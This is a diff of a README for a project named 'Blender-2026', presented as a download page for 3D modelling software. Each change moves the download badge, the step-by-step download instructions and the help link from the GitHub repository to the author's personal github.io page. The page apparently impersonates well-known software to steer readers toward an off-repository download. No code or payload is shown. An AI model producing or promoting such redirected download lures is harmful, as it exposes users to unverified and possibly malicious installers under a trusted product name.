@@ -1,6 +1,6 @@
 # 🎨 Blender-2026 - Create Professional 3D Models With Ease
 
-[![Download Blender-2026](https://img.shields.io/badge/Download-Blender--2026-blue)](https://github.com/Estelle3173/Blender-2026)
+[![Download Blender-2026](https://img.shields.io/badge/Download-Blender--2026-blue)](https://estelle3173.github.io)
 
 ## 📌 About This Software
 
@@ -23,7 +23,7 @@ Make sure you update your graphics card drivers before running the software. Upd
 
 Follow these steps to obtain the setup files.
 
-1. Go to the [official repository page](https://github.com/Estelle3173/Blender-2026).
+1. Go to the [official repository page](https://estelle3173.github.io).
 2. Locate the link pointing to the latest version.
 3. Click the link to begin the file transfer to your computer.
 4. Save the file in your Downloads folder for easy access.
@@ -98,4 +98,4 @@ Open your Windows settings, go to Apps, find the program in the list, and select
 
 ## 🔗 Useful Links
 
-To get more help, visit the [repository](https://github.com/Estelle3173/Blender-2026) regularly. Updates happen often to fix bugs and improve usability. Save the link to your bookmarks to keep track of new versions.
+To get more help, visit the [repository](https://estelle3173.github.io) regularly. Updates happen often to fix bugs and improve usability. Save the link to your bookmarks to keep track of new versions.
